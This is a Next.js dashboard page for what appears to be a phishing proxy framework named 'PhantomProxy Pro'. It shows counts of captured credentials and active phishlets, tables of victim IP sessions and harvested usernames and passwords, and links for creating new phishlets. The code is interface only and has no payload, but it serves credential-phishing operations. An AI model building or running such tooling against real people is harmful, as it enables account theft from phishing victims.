'use client';

import { useQuery } from '@tanstack/react-query';
import Link from 'next/link';
import { fetchStats, fetchSessions, fetchCredentials } from '@/lib/api';
import { Card } from '@/components/Card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/Table';
import {
  Users,
  Key,
  Shield,
  Activity,
  Server,
  Clock,
  CheckCircle,
  AlertCircle
} from 'lucide-react';

export default function Dashboard() {
  const { data: stats, isLoading: statsLoading } = useQuery({
    queryKey: ['stats'],
    queryFn: fetchStats,
    refetchInterval: 10000,
  });

  const { data: sessionsData, isLoading: sessionsLoading } = useQuery({
    queryKey: ['sessions'],
    queryFn: () => fetchSessions(10, 0),
    refetchInterval: 5000,
  });

  const { data: credsData, isLoading: credsLoading } = useQuery({
    queryKey: ['credentials'],
    queryFn: () => fetchCredentials(10, 0),
    refetchInterval: 5000,
  });

  const sessions = sessionsData?.sessions || [];
  const credentials = credsData?.credentials || [];

  return (
    <main className="min-h-screen bg-zinc-950 text-white">
      {/* Header */}
      <nav className="border-b border-zinc-800 px-6 py-4 bg-zinc-900/50">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Shield className="w-8 h-8 text-cyan-500" />
            <div>
              <h1 className="text-xl font-bold">PhantomProxy Pro</h1>
              <p className="text-xs text-zinc-500">v13.0.0 - Enterprise Edition</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <Link
              href="/sessions"
              className="text-sm text-zinc-400 hover:text-white transition-colors"
            >
              Sessions
            </Link>
            <Link
              href="/credentials"
              className="text-sm text-zinc-400 hover:text-white transition-colors"
            >
              Credentials
            </Link>
            <Link
              href="/phishlets"
              className="text-sm text-zinc-400 hover:text-white transition-colors"
            >
              Phishlets
            </Link>
            <a
              href="/api/v1/health"
              target="_blank"
              rel="noopener"
              className="text-sm text-cyan-500 hover:underline"
            >
              API Health
            </a>
          </div>
        </div>
      </nav>

      {/* Content */}
      <div className="p-6 space-y-6">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          <Card
            title="Total Sessions"
            value={stats?.total_sessions ?? 0}
            loading={statsLoading}
            icon={Users}
          />
          <Card
            title="Credentials Captured"
            value={stats?.total_credentials ?? 0}
            loading={statsLoading}
            icon={Key}
          />
          <Card
            title="Active Phishlets"
            value={stats?.active_phishlets ?? 0}
            loading={statsLoading}
            icon={Server}
          />
          <Card
            title="Total Requests"
            value={stats?.total_requests ?? 0}
            loading={statsLoading}
            icon={Activity}
          />
        </div>

        {/* Main Content Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Recent Sessions */}
          <section className="bg-zinc-900 rounded-lg border border-zinc-800 overflow-hidden">
            <div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between">
              <h2 className="font-semibold flex items-center gap-2">
                <Clock className="w-4 h-4 text-zinc-500" />
                Recent Sessions
              </h2>
              <Link href="/sessions" className="text-xs text-cyan-500 hover:underline">
                View all →
              </Link>
            </div>
            <div className="overflow-x-auto max-h-80">
              {sessionsLoading ? (
                <div className="p-8 text-center text-zinc-500">Loading...</div>
              ) : sessions.length === 0 ? (
                <div className="p-8 text-center text-zinc-500 flex flex-col items-center gap-2">
                  <AlertCircle className="w-8 h-8 opacity-50" />
                  <p>No sessions yet</p>
                </div>
              ) : (
                <Table>
                  <TableHeader>
                    <TableHead>IP Address</TableHead>
                    <TableHead>Phishlet</TableHead>
                    <TableHead>State</TableHead>
                    <TableHead>Last Active</TableHead>
                  </TableHeader>
                  <TableBody>
                    {sessions.map((s: {
                      id: string;
                      victim_ip: string;
                      phishlet_id: string;
                      state: string;
                      last_active: string;
                    }) => (
                      <TableRow key={s.id}>
                        <TableCell className="font-mono text-xs">{s.victim_ip}</TableCell>
                        <TableCell>{s.phishlet_id || '-'}</TableCell>
                        <TableCell>
                          <span className={s.state === 'captured' ? 'text-green-500' : 'text-yellow-500'}>
                            {s.state}
                          </span>
                        </TableCell>
                        <TableCell className="text-xs text-zinc-500">
                          {new Date(s.last_active).toLocaleString()}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              )}
            </div>
          </section>

          {/* Recent Credentials */}
          <section className="bg-zinc-900 rounded-lg border border-zinc-800 overflow-hidden">
            <div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between">
              <h2 className="font-semibold flex items-center gap-2">
                <Key className="w-4 h-4 text-zinc-500" />
                Recent Credentials
              </h2>
              <Link href="/credentials" className="text-xs text-cyan-500 hover:underline">
                View all →
              </Link>
            </div>
            <div className="overflow-x-auto max-h-80">
              {credsLoading ? (
                <div className="p-8 text-center text-zinc-500">Loading...</div>
              ) : credentials.length === 0 ? (
                <div className="p-8 text-center text-zinc-500 flex flex-col items-center gap-2">
                  <CheckCircle className="w-8 h-8 opacity-50" />
                  <p>No credentials captured yet</p>
                </div>
              ) : (
                <Table>
                  <TableHeader>
                    <TableHead>Username</TableHead>
                    <TableHead>Password</TableHead>
                    <TableHead>Captured</TableHead>
                  </TableHeader>
                  <TableBody>
                    {credentials.map((c: {
                      id: string;
                      username: string;
                      password?: string;
                      captured_at: string;
                    }) => (
                      <TableRow key={c.id}>
                        <TableCell className="font-mono text-xs truncate max-w-[150px]">
                          {c.username}
                        </TableCell>
                        <TableCell className="font-mono text-xs truncate max-w-[150px] text-zinc-500">
                          {c.password ? '••••••••' : '-'}
                        </TableCell>
                        <TableCell className="text-xs text-zinc-500">
                          {new Date(c.captured_at).toLocaleString()}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              )}
            </div>
          </section>
        </div>

        {/* Quick Actions */}
        <section className="bg-zinc-900 rounded-lg border border-zinc-800 p-4">
          <h3 className="text-sm font-semibold mb-3 text-zinc-400">Quick Actions</h3>
          <div className="flex flex-wrap gap-3">
            <Link
              href="/phishlets/new"
              className="px-4 py-2 bg-cyan-600 hover:bg-cyan-700 rounded text-sm transition-colors"
            >
              + New Phishlet
            </Link>
            <Link
              href="/config"
              className="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 rounded text-sm transition-colors"
            >
              Settings
            </Link>
            <a
              href="/docs"
              className="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 rounded text-sm transition-colors"
            >
              Documentation
            </a>
          </div>
        </section>
      </div>
    </main>
  );
}
